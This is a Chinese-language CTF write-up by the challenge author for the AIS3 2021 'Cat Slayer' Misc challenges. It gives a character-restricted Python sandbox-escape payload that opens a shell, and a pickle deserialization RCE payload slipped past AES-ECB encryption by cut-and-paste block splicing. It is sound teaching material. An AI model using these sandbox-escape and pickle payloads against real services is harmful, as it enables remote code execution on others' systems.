# AIS3 2021 Pre-Exam [Misc]

## Cat Slayer <sup>Fake</sup> | Nekogoroshi

- Category: Welcome
- Difficulty: Welcome
- Solves: 315/327 (Pre-Exam), 102/190 (MyFirstCTF)
- Keywords: Welcome

玩梗題(X)，純粹回想到之前看寒蟬的時候有一個看起來很適合出水題的場景就出了，讚

反正就是密碼一共 13 個數字，只要一輸錯一個字就會鎖死，因此可以針對單一個字開始依序爆搜，最多只要猜 `(13*10)=130` 次就能解開了。

教學影片：https://youtu.be/2b3Oqo13-r0?t=1296

### Solution 0x01

手解。不到 10 分鐘吧

### Solution 0x02

寫腳本解。用 expect 或 pwntools 還是什麼隨便你，但寫+跑的時間應該不會比手爆還快 XD


## Cat Slayer | Online Edition

- Category: Misc
- Difficulty: Easy
- Solves: 12/327
- Keywords: Game, Python Sandbox

原本是希望大家認真打怪，但由於 code 寫太爛寫出了一個輸入負數值洗錢的 bug，但也沒差，反正蠻契合 CTF 主題的 XD

### Overview

一個附加了遊戲屬性的 Python sandbox 題。

玩家可以透過遊戲中賺取的錢解鎖 payload 可用字元，但解鎖的同時也會減少可用 payload 長度；然而，等級達到十等並轉生之後便能解除 payload 長度的限制，並且可以獲得 `"'.` 這三個重要字元。

其中使用者輸入的 payload (spell) 會被丟到一個 sandbox 執行，它先刪除了 `__import__`, `exec`, `eval` 這些內建函數，並會用 `_eval(spell, {})` 執行它。

另外此遊戲還有玩家對戰（殺人）機制，被殺的人帳號會**永久封鎖**。

### Solution

刷錢的部分我就不提了，直接講怎麼 get shell 吧。我的最低練度預期解是 lv.3 無轉生並解鎖 14 個字元（詛咒）即可 RCE，理論上是一個手動正常遊玩就可以刷到的等級（？

- 需解除的詛咒：`{'t', 'i', 'p', 'g', '(', 'r', ')', 'e', 'l', 'u', 'o', 'd', 'n', 'a'}`

- Payload
    ```python
    [g:=getattr,i:=input,g(g(__loader__,i())(i()),i())(i())]
    ```

- 搭配以下 stdin 輸入
    ```
    load_module
    os
    system
    sh
    ```

翻譯成白話文就是：`__loader__.load_module('os').system('sh')` 而已

由於沒有轉生，還沒有 `.` 可以用，於是就用 `getattr(aaa, 'bbb')` 來取代 `aaa.bbb`；並用 `input()` 來讀入使用者輸入產生字串，以避免使用到 `'"`（還能藉此減少使用的字元呢）

當然你要轉生+刷滿詛咒，再用超老梗的 `[].__class__.__base__.__subclasses__()[xx]...` 找到 `<class 'os._wrap_close'>` 直接串下去也是可以啦，這題定位本來就不是難題（？

--- 

由於這題不是難題，而且肯努力刷的話是可以用很簡單的方法解掉的，因此我的原先預期上是先解的人要負責努力殺新來的玩家，也就是說**越晚解題的難度會越高**，就算知道解法也不太能輕鬆拿到 flag，但一開始大家好像都沒做到，直到最後一天才開始有人認真殺人 QQ

## Cat Slayer | Cloud Edition

- Category: Misc
- Difficulty: Medium
- Solves: 1/327
- Keywords: Pickle, ECB Cut & Paste

我承認這題以 pre-exam 來說是偏難的題目 ><

### Solution

Crypto 的部分樸實無華，只是經典的 AES ECB cut & paste，大概是拿 ECB 去 Google 會發現的前幾個攻擊手法。那我們要 cut & paste 什麼東西呢？就是用來存檔讀檔的 pickle —— pickle 如果可以任意控制，那就能輕鬆達成 RCE 了，這邊給一個最常見的範例。

```python
class Exploit():
    def __reduce__(self):
        return (__import__('os').system, ('sh', ))

pkl = pickle.dumps(Exploit())
pickle.loads()
sh$ ...
```

首先要釐清的是哪些是使用者可控的部分呢？最明顯的肯定是名字了，可以自由的輸入任意的字串，那直覺上來說，是不是只要把字串設定成 `pickle.dumps(Exploit())` 的內容就好了呢？預設來說，ECB 加密（block size = 16）後的每個 block 會這樣分佈，其中最左邊那排代表第 n 個 block：
```python
0 b'\x80\x04\x95`\x00\x00\x00\x00\x00\x00\x00\x8c\x08__m'
1 b'ain__\x94\x8c\tCatSlaye'
2 b'r\x94\x93\x94)\x81\x94}\x94(\x8c\x08user'
# 以下 X, Y 皆代表 `pickle.dumps(CatSlayer()) 時 username 所在處
3 b'name\x94\x8c\x0cXXXXXXXXX'
4 b 'YYY\x94\x8c\x02hp\x94M\xe8\x03\x8c\x04at'
5 b'tk\x94K\n\x8c\x04defs\x94K\x00\x8c\x05'
6 b'money\x94K\x00ub.'
```
這樣看起來，把 YYY 開始的部分都換成 `pickle.dumps(Exploit())` ，然後移掉前面 0~3 個 block 就完成了吧？（也就是說，name 輸入為 `"XXXXXXXXX" + pickle.dumps(Exploit())`）

沒那麼簡單，先來看一下 pickle dump 出來的東西是啥：
```python
b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02sh\x94\x85\x94R\x94.'
```
對於普通字串而言，如果 `0x7f` <= char <= `0xbf`，則該 char 在 `pickle.dumps` 後前面會被多塞一個 `\xc2`，例如：`\x98` 會變 `\xc2\x98`。你可能會想說，那我避開這個範圍的字元不就行了？並沒有。如果你的 pickle 不需要用到這個範圍的字元卻想 import module 的話，全部都需要用到換行字元ㄛ，`input` 可不吃這種東西

其實我們只要把 `\xc2` 留在前一個 block 廢棄掉就行，padding 有很多方法可以塞，其中最萬用的是利用 `(0` 當 padding 解決（`(0` 代表 push mark 之後再 pop，等於什麼事情都沒做）

有了這個思路之後就能來構造輸入了：

首先，把前面 `pickle.dumps(Exploit())` 的結果簡化移除不必要的東西後，大概剩這樣
```python
b'\x80\x04U\x02osU\x06system\x93U\x02sh\x85R.'

Disassemble:
    0: \x80 PROTO      4
    2: U    SHORT_BINSTRING 'os'
    6: U    SHORT_BINSTRING 'system'
   14: \x93 STACK_GLOBAL
   15: U    SHORT_BINSTRING 'sh'
   19: \x85 TUPLE1
   20: R    REDUCE
   21: .    STOP
```
如此一來只剩下三個字元 > 0x7f 了，接下來構造一下要輸入的 name：

```python
# 把真正要用的 exploit 擠到下一個 block。注意：底下的 \x80 會變 \xc2\x80，要把 \xc2 留在上面
'AAAAAAAA' + 
'\x80\x04U\x02osU\x06system' + '(0' +  # [[BLOCK1]]，此處用 `(0` 當 padding
'AAAAAAAAAAAAAAA' + # 擠掉一整個 block，並把 \xc2 留在此 block
'\x93U\x0dsh #AAAAAAAAA' +  # [[BLOCK2]]
'AAAAAAAAAAAAAAA' + # 擠掉一整個 block，並把 \xc2 留在此 block
'\x85R.'    # [[BLOCK3]]
```
最後，ECB 加密的 block 會這樣分佈：
```python
0 b'\x80\x04\x95\xa0\x00\x00\x00\x00\x00\x00\x00\x8c\x08__m'
1 b'ain__\x94\x8c\tCatSlaye'
2 b'r\x94\x93\x94)\x81\x94}\x94(\x8c\x08user'
3 b'name\x94\x8cLAAAAAAAA\xc2' # name 從這邊的 AAAAAAAA 開始
4 b'\x80\x04U\x02osU\x06system(0'  # [[BLOCK1]]
5 b'AAAAAAAAAAAAAAA\xc2'
6 b'\x93U\rsh #AAAAAAAAA' # [[BLOCK2]]
7 b'AAAAAAAAAAAAAAA\xc2'
8 b'\x85R.\x94\x8c\x02hp\x94M\xe8\x03\x8c\x04at' # [[BLOCK3]]; name 到這邊的 `\x85R.` 結束
9 b'tk\x94K\n\x8c\x04defs\x94K\x00\x8c\x05'
0 b'money\x94K\x00ub.'
```
可以看得出來，我們要的 exploit 就在加密後的第 4, 6, 8 個 block。

此時只要先把玩家名稱設為上述的惡意 name，再去 save game 拿出加密後的資料，並取出第 4, 6, 8 個 block 拼接起來，接著去 load game 裏輸入這串內容就能 get shell 了。

詳情請見 [exploit.py](cat-slayer-cloud/exploit.py)